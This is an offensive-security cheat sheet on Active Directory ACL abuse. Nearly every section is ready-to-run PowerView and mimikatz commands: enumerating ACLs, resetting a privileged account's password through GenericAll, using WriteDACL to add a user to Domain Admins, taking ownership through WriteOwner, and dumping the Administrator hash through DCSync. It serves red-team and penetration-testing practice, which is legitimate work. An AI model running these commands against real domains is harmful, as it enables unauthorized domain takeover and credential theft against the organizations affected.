# ACL Abuse

!!! tip "Tip"
    BloodHound highlights ACL abuse paths (WriteDACL, GenericAll, GenericWrite, ForceChangePassword). Use `PowerView` to enumerate and exploit: `Add-DomainObjectAcl`, `Set-DomainUserPassword`, etc.

---

## Identifying Vulnerable ACLs

### Enumerate ACLs with PowerView

```powershell
Get-ObjectAcl -DistinguishedName "CN=Domain Admins,CN=Users,DC=corp,DC=com" -ResolveGUIDs | Format-Table SecurityIdentifier,ActiveDirectoryRights
```

### Convert SIDs to Usernames

```powershell
Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-1104
```

---

## Exploiting `GenericAll`

If a low-privileged user has `GenericAll` on a privileged account, they can reset the password.

```powershell
Set-DomainUserPassword -Identity admin -NewPassword (ConvertTo-SecureString "NewPass123!" -AsPlainText -Force)
```

```powershell
net use \\dc01 /user:corp\admin NewPass123!
```

---

## Exploiting `WriteDACL`

Grant `GenericAll` to a controlled account:

```powershell
Add-ObjectAcl -TargetIdentity "Domain Admins" -PrincipalIdentity "user1" -Rights GenericAll
```

Add that account to Domain Admins:

```powershell
Add-DomainGroupMember -Identity "Domain Admins" -Members user1
```

---

## Exploiting `WriteOwner`

Take ownership of a privileged account:

```powershell
Set-DomainObjectOwner -Identity "admin" -OwnerIdentity "user1"
```

Then grant full control:

```powershell
Add-ObjectAcl -TargetIdentity "admin" -PrincipalIdentity "user1" -Rights GenericAll
```

---

## DCSync via `Replicating Directory Changes`

### Check for DCSync Privileges

```powershell
Get-ObjectAcl -DistinguishedName "DC=corp,DC=com" -ResolveGUIDs | ? {($_.ActiveDirectoryRights -match "Replicating")}
```

### Extract Hashes

```powershell
mimikatz # lsadump::dcsync /domain:corp.com /user:Administrator
```
